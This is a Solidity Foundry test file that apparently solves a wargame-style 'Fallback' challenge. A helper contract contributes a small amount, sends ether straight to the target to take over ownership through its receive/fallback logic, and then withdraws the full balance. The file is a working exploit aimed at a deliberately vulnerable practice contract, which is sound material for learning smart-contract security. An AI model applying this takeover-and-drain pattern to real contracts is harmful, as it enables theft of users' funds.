// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {FallbackReceiver} from "../src/fallback/FallbackReceiver.sol";
import {Test, console2} from "forge-std/Test.sol";
import {Fallback} from "../src/fallback/Fallback.sol";


contract FallbackTest is Test {
    Fallback public sc;
    FallbackReceiver hacker;

    function setUp() public {
        sc = new Fallback();
        hacker = new FallbackReceiver();
    }

    function test_Hack() public {
        address hackerAdd = address(hacker);
        vm.deal(hackerAdd, 5 ether);
        vm.startBroadcast(hackerAdd);
        // send eths to the contract
        sc.contribute{value: 1}();
        assertEq(sc.owner(), address(this));
        //  send eths to the contract again
        (bool success, bytes memory _msg) = payable(sc).call{value: 1}("");
        if(!success) {
            console2.log("send eth failed");
            revert(string(_msg));
        }
        assertEq(address(sc).balance, 2);
        sc.withdraw();
        assertEq(sc.owner(), hackerAdd);
        assertEq(address(sc).balance, 0);

    }
}
